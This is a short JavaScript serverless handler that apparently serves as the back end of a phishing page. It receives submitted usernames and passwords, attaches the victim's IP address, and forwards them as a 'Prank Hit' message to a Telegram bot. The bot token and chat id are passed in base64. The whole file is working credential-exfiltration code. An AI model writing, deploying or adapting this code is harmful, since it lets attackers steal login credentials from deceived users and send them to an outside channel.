export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();

    const { config, data } = req.body;

    // Decode the Telegram credentials from Base64
    const decoded = JSON.parse(Buffer.from(config, 'base64').toString());

    const message = `🎯 **Prank Hit**\n\n👤 User: ${data.User}\n🔑 Pass: ${data.Pass}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}`;

    // Send to Telegram API
    const tgUrl = `https://api.telegram.org/bot${decoded.t}/sendMessage`;
    
    await fetch(tgUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: decoded.c,
            text: message,
            parse_mode: 'Markdown'
        })
    });

    return res.status(200).json({ success: true });
}
